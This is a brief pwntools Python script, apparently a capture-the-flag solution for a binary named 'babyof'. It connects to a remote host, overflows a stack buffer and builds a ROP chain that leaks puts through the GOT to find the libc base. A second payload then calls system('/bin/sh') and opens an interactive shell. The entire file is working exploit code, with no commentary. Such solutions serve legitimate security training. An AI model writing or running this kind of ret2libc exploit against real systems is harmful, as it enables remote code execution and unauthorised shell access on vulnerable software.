from pwn import *

context.log_level='debug'

#p = process('./babyof')
p = remote("182.116.62.85",21613)
elf = ELF('./babyof')
libc = ELF('./libc-2.27.so')
main = 0x0000000000400550
pop_rdi = 0x0000000000400743
ret = 0x0000000000400506


#attach(p,'b *0x0000000000400669')
pause()
payload = 'a'*0x40 + 'junkjunk' + p64(pop_rdi) +p64(elf.got['puts'])+ p64(elf.plt['puts']) + p64(main)
p.recvuntil('Do you know how to do buffer overflow?\n')
p.sendline(payload)
p.recvuntil('I hope you win')
puts = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
print "puts=>[+]"+hex(puts)
libc_base = puts-libc.sym['puts']
print "libc=>[+]"+hex(libc_base)
pause()

binsh = 0x00000000001b3e1a + libc_base
system = libc_base + 0x4f550#libc.sym['system']
print "sys=>[+]"+hex(system)
payload = 'a'*0x40 + 'junkjunk' + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system) + p64(system)

p.recvuntil('Do you know how to do buffer overflow?\n')
p.sendline(payload)
# leak()
# payload = 
p.interactive()